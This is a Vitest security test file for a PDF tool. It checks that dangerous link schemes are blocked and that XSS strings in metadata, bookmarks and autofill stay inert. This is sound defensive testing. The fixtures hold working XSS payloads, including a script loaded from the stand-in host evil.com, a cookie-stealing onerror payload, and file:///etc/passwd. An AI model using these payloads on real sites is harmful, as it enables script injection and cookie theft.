import { describe, it, expect } from 'vitest';
import { PDFDocument } from 'pdf-lib';
import { validateLinkSafety } from '../src/security/linkSafety';
import { getPdfMetadata, setPdfMetadata } from '../src/security/metadata';
import { addBookmark, flattenBookmarks } from '../src/pages/bookmarks';
import { autofillFormFields, type AutofillProfile } from '../src/forms/autofill';
import type { AcroFormField } from '../src/forms/types';
import type { BookmarkItem } from '../src/pages/types';

describe('Task 17.8: Security Tests & Comprehensive XSS Review', () => {
  const XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(document.cookie)">',
    '"><script src="https://evil.com/xss.js"></script>',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox("xss")',
    '<svg/onload=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}'
  ];

  describe('External Link & Action Safety (validateLinkSafety)', () => {
    it('blocks dangerous URI schemes (javascript:, data:, vbscript:, file:)', () => {
      const dangerousUrls = [
        'javascript:alert(1)',
        'JAVASCRIPT:alert(1)',
        ' javascript:void(0)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'DATA:text/html,<svg onload=alert(1)>',
        'vbscript:alert(document.domain)',
        'file:///C:/Windows/System32/calc.exe',
        'file:///etc/passwd'
      ];

      for (const url of dangerousUrls) {
        const result = validateLinkSafety(url);
        expect(result.isSafe).toBe(false);
        expect(result.reason).toBeDefined();
      }
    });

    it('allows valid web URLs (https://, http://, mailto:) with appropriate confirmation rules', () => {
      const httpUrls = [
        'https://example.com',
        'https://subdomain.example.org/path/to/doc?query=1&b=2#section',
        'http://localhost:3000'
      ];

      for (const url of httpUrls) {
        const result = validateLinkSafety(url);
        expect(result.isSafe).toBe(true);
        expect(result.requiresConfirmation).toBe(true);
      }

      const mailtoResult = validateLinkSafety('mailto:support@rhypdf.local?subject=Feedback');
      expect(mailtoResult.isSafe).toBe(true);
      expect(mailtoResult.requiresConfirmation).toBe(false);
    });
  });

  describe('Document Metadata XSS Invariance', () => {
    it('preserves hostile strings verbatim in metadata dictionary without script execution or encoding damage', async () => {
      const pdfDoc = await PDFDocument.create();
      pdfDoc.addPage([400, 400]);

      for (const payload of XSS_PAYLOADS) {
        const pdfBytes = await pdfDoc.save();
        const updatedBytes = await setPdfMetadata(pdfBytes, {
          title: payload,
          author: payload,
          subject: payload,
          keywords: ['security-test']
        });

        const meta = await getPdfMetadata(updatedBytes);
        expect(meta.title).toBe(payload);
        expect(meta.author).toBe(payload);
        expect(meta.subject).toBe(payload);
      }
    });
  });

  describe('Bookmark & Outline XSS Invariance', () => {
    it('extracts hostile bookmark titles as raw plain text with zero HTML injection vulnerabilities', () => {
      for (const payload of XSS_PAYLOADS) {
        const initialTree: BookmarkItem[] = [];
        const { tree } = addBookmark(initialTree, null, {
          title: payload,
          pageIndex: 0
        });

        expect(tree[0].title).toBe(payload);
        const flat = flattenBookmarks(tree);
        expect(flat[0].item.title).toBe(payload);
        expect(typeof flat[0].item.title).toBe('string');
      }
    });
  });

  describe('Interactive Form Fields & Autofill XSS Safety', () => {
    it('safely binds, autofills, and processes hostile payload form field values', () => {
      const hostileFields: AcroFormField[] = [
        {
          id: 'field-name',
          name: 'fullName',
          type: 'text',
          pageIndex: 0,
          rect: { left: 50, bottom: 500, right: 250, top: 520 },
          value: '<script>alert("XSS")</script>',
          readOnly: false,
          required: false
        },
        {
          id: 'field-choice',
          name: 'userRole',
          type: 'choice',
          pageIndex: 0,
          rect: { left: 50, bottom: 450, right: 250, top: 470 },
          value: '<img src=x onerror=alert(1)>',
          options: ['Normal User', '<img src=x onerror=alert(1)>'],
          readOnly: false,
          required: false
        }
      ];

      const profile: AutofillProfile = {
        fullName: '"><script>alert(1)</script>',
        email: 'attacker@evil.com'
      };

      // Autofill with hostile profile data
      const matched = autofillFormFields(hostileFields, profile);
      expect(matched.get('field-name')).toBe('"><script>alert(1)</script>');
    });
  });

  describe('Text Search & Highlight Sanitization', () => {
    it('safely handles regex special chars and HTML syntax without throwing or injecting HTML', () => {
      const queries = ['.*', '(.*)+', '[a-z]+', '<script>', '<b>bold</b>', '\\', '?', '+', '{}'];

      for (const q of queries) {
        const escaped = q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        expect(() => new RegExp(escaped, 'gi')).not.toThrow();
      }
    });
  });
});
